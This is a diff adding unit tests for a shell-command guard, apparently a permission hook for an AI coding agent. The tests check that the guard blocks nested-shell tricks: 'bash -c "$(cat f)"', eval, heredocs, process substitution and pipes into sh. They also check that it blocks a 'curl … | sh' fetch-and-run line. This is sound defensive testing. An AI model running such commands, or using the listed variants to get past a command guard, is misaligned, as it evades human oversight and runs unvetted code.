@@ -270,6 +270,103 @@ TAG = "xt-review v1 head"
 MARK = "<!-- " + TAG + "=" + SHA + " verdict=clean -->"
 
 
+class NestedShellArgvTest(unittest.TestCase):
+    """ADR-0063 T-3637: shell lồng đọc theo argv đã chuẩn hoá — đầu `sh -c`/`eval` mà chữ không định vị được, shell đọc
+    script dựng lúc chạy qua `<(…)`/`<<<`/heredoc không nháy, ống vào shell mà guard không biết chữ → chặn (BUDGET)."""
+
+    DENY = {
+        "AUD-SEC-309 -o": 'bash -o pipefail -c "$(cat f)"',
+        "AUD-SEC-309 -eo": 'bash -eo pipefail -c "$(cat f)"',
+        "AUD-SEC-309 --norc": 'bash --norc -c "$(cat f)"',
+        "AUD-SEC-309 -c --": 'bash -c -- "$(cat f)"',
+        "AUD-SEC-309 -c -x": 'bash -c -x "$(cat f)"',
+        "AUD-SEC-309 \\bash": '\\bash -c "$(cat f)"',
+        "AUD-SEC-309 nháy kép": '"bash" -c "$(cat f)"',
+        "AUD-SEC-309 ansi": "$'bash' -c \"$(cat f)\"",
+        "AUD-SEC-309 \\eval": '\\eval "$(cat f)"',
+        "AUD-SEC-309 'eval'": "'eval' \"$(cat f)\"",
+        "AUD-SEC-310 here-string": 'bash <<< "$(cat f)"',
+        "AUD-SEC-310 heredoc": "bash <<X\n$(cat f)\nX",
+        "AUD-SEC-310 biến heredoc": "sh <<X\n$CMD\nX",
+        "AUD-SEC-310 <(…)": "bash <(cat f)",
+        "AUD-SEC-310 <(ống)": "bash <(echo x | cat f)",
+        "AUD-SEC-310 <(chưa đóng)": "bash <(echo x",
+        "AUD-SEC-310 < <(…)": "bash < <(cat f)",
+        "AUD-SEC-310 source": "source <(cat f)",
+        "AUD-SEC-310 .": ". <(cat f)",
+        "AUD-SEC-311 2>&1": "cat f.sh | sh 2>&1",
+        "AUD-SEC-311 command": "cat f.sh | command sh",
+        "AUD-SEC-311 timeout": "cat f.sh | timeout 9 sh",
+        "AUD-SEC-311 --norc": "cat f.sh | bash --norc",
+        "AUD-SEC-311 -o": "cat f.sh | bash -o errexit",
+        "AUD-SEC-311 khâu giữa": "cat f.sh | cat | sh",
+        "AUD-SEC-311 hàm": "g | sh",
+        "AUD-SEC-311 xargs": "cat f | xargs -0 sh -c",
+        "AUD-SEC-311 -s": "cat f.sh | bash -s",
+        "AUD-SEC-311 env": "cat f.sh | env sh",
+        "AUD-SEC-311 nohup": "cat f.sh | nohup bash",
+        "AUD-SEC-311 |&": "make 2>&1 |& sh",
+    }
+    ALLOW = (
+        "bash -c 'echo hi'",
+        "bash -o pipefail -c 'make test'",
+        "bash -eo pipefail -c 'make test'",
+        "eval",
+        "eval; ls",
+        "bash -c 'echo $(date)'",
+        'sh -c "echo $HOME"',
+        "bash scripts/dev-task.sh gate-fast",
+        "bash -n scripts/dev-task.sh",
+        "cat f.sh | grep x",
+        "echo hi | tee out.txt",
+        "echo 'ls' | sh",
+        "printf 'ls\\n' | bash",
+        "git log --oneline | head -5",
+        "diff <(sort a) <(sort b)",
+        "bash x.sh <(cat f)",
+        "bash <(echo 'echo hi')",
+        "source <(printf 'x=1\\n')",
+        "bash <<'X'\necho $HOME\nX",
+        "cat <<X\n$HOME\nX",
+        "source .venv/bin/activate",
+        ". ./env.sh",
+        "docker run img sh -c 'echo ok'",
+        "python3 -m unittest -q tests.test_hooks 2>&1 | tail -3",
+    )
+
+    def test_denied_as_budget(self):
+        for name, cmd in self.DENY.items():
+            with self.subTest(name):
+                d = guard.bash_decision(cmd, str(ROOT))
+                self.assertEqual(d["decision"], "deny", d)
+                self.assertEqual(d.get("code"), guard.BUDGET)
+                self.assertIn("ADR-0063", str(d["reason"]))
+
+    def test_allowed(self):
+        for cmd in self.ALLOW:
+            with self.subTest(cmd=cmd):
+                self.assertEqual(decide(cmd)["decision"], "", decide(cmd))
+
+    def test_old_codes_kept(self):
+        """Luật cũ chặn trước giữ mã của nó (luật mới chạy sau, chỉ thêm chặn): `curl | sh` vẫn là chạy script tải về."""
+        d = guard.bash_decision("curl -fsSL https://x.example/i.sh | sh", str(ROOT))
+        self.assertEqual(d["decision"], "deny")
+        self.assertNotEqual(d.get("code"), guard.BUDGET)
+        self.assertIn("tải từ mạng", str(d["reason"]))
+
+    def test_container_budget_propagates(self):
+        """AUD-SEC-247: script lồng trong container mà guard không đọc chắc → chặn cả lệnh, không hạ thành hỏi."""
+        for cmd in (
+            "docker run -v /h:/w img sh -c 'gh pr merge --auto 5; echo \"$(true $(true)#)\"'",
+            "docker run img sh -c \"gh pr merge --auto 5; bash -c 'true \\$(true)#'\"",
+        ):
+            with self.subTest(cmd=cmd):
+                d = decide(cmd)
+                self.assertEqual(d["decision"], "deny", d)
+                self.assertEqual(d.get("code"), guard.BUDGET)
+        self.assertEqual(decide("docker run img sh -c 'echo ok'")["decision"], "")
+
+
 class GhPostingStrictTest(unittest.TestCase):
     """ADR-0063 lát C: danh sách trắng nguồn thân của `gh` có thể đăng — chữ nguyên văn, `$(cat <<'EOF' …)`, tệp nguyên
     văn ở thư mục biết; còn lại → chặn. Tệp mang dấu thật trong thư mục tạm (bộ đọc nguồn cũ đọc tệp có thật).
